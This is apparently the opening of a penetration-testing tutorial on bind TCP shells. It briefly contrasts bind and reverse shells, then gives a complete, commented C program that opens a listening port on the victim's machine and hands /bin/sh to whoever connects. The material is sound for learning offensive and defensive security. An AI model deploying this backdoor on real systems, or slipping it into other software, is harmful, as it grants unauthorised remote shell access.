# Bind TCP Shell

Today, we will deal with the process of creating Bind TCP Shell from scratch. As a rule, we distinguish between two types of shells that interest the pentester:
- Bind TCP Shell
- Reverse TCP Shell
In the first case, it involves opening a listening port on the victim's system so that the attacker can remotely connect to his shell.

First, we'll try to reproduce this behavior using a C program.

```c
#include <stdio.h>
#include <netinet/in.h>

// Change the correct port here
#define PORT 4444

int main(int argc, char **argv)
{	
	// sys_socket()	- Creating a socket (interface) for communication
	int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	// sys_bind() - Binding to a specified address and port 
	struct sockaddr_in address;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;
	bind(bind_socket,(struct sockaddr *)&address, sizeof(address));
	
	// sys_listen() - Listening for incoming connection 
	listen(bind_socket,0);
	
	// sys_accept() - Accepting the incoming connection
	int sock = accept(bind_socket,NULL,NULL);
	
	// sys_dup2() - Configuring STDIN/STDOUT and STDERR for proper shell functioning
	dup2(sock,2);	// STDERR
	dup2(sock,1);	// STDOUT
	dup2(sock,0);	// STDIN
	
	// sys_execve() - Establishing a shell using /bin/sh
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
```
